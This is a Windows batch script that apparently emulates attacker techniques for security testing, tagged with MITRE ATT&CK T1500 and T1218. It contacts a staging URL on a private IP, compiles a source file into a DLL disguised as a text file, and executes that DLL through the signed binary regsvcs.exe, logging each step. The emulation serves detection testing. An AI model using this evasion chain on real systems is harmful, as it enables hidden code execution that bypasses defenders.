@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET recnn=%APPDATA%\7643\0a6d90f3
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?7643-10
SET lqyereup=ITZEL-S2BS
SET ufeybybm=10
SET hpnjatpj=illustrator.txt
SET njozco=file.txt
SET kkjwr=7643

REM TTP variables
SET pkjgc=1
SET vbyje=
SET mfsa=T1500
SET slftc=Compile_After_Delivery
SET mfsb=T1218
SET jqyc=Signed_Binary_Proxy_Execution

REM Generated variables
SET ghtn=%APPDATA%\!ufeybybm!
SET opqx=%ghtn%\macula-simulations.log

REM Step 1: Check server availability
curl -k -s -o nul "!uouoq!" >nul 2>&1

REM Step 2: Change to output directory
IF NOT EXIST "!recnn!\" (
    mkdir "!recnn!" >nul 2>&1
)
cd /d "!recnn!" >nul 2>&1

REM T1500: Compile After Delivery
SET pkjgc=1
SET vbyje=
IF NOT EXIST "%WINDIR%\Microsoft.NET\Framework\v4.0.30319\csc.exe" (
    SET pkjgc=0
    SET vbyje=compiler_not_found
) ELSE (
    "%WINDIR%\Microsoft.NET\Framework\v4.0.30319\csc.exe" /target:library /reference:System.EnterpriseServices.dll /out:"!hpnjatpj!" "!njozco!" >nul 2>&1
    IF NOT EXIST "!hpnjatpj!" (
        SET pkjgc=0
        SET vbyje=compile_failed
    )
)

REM Log T1500
SET fbyg=%DATE:~-4%-%DATE:~4,2%-%DATE:~7,2% %TIME:~0,2%:%TIME:~3,2%:%TIME:~6,2%.%TIME:~9,2%
(echo [!fbyg!][!lqyereup!]: !ufeybybm!-!kkjwr!-!mfsa!|!slftc!=!pkjgc!:!vbyje!) >> "!opqx!" 2>nul || rem

REM T1218: Signed Binary Proxy Execution via regsvcs.exe
SET pkjgc=1
SET vbyje=
IF EXIST "!hpnjatpj!" (
    regsvcs.exe "!hpnjatpj!" >nul 2>&1
    IF ERRORLEVEL 1 (
        SET pkjgc=0
        SET vbyje=execution_failed
    )
) ELSE (
    SET pkjgc=0
    SET vbyje=dll_not_found
)

REM Log T1218
SET fbyg=%DATE:~-4%-%DATE:~4,2%-%DATE:~7,2% %TIME:~0,2%:%TIME:~3,2%:%TIME:~6,2%.%TIME:~9,2%
(echo [!fbyg!][!lqyereup!]: !ufeybybm!-!kkjwr!-!mfsb!|!jqyc!=!pkjgc!:!vbyje!) >> "!opqx!" 2>nul || rem

ENDLOCAL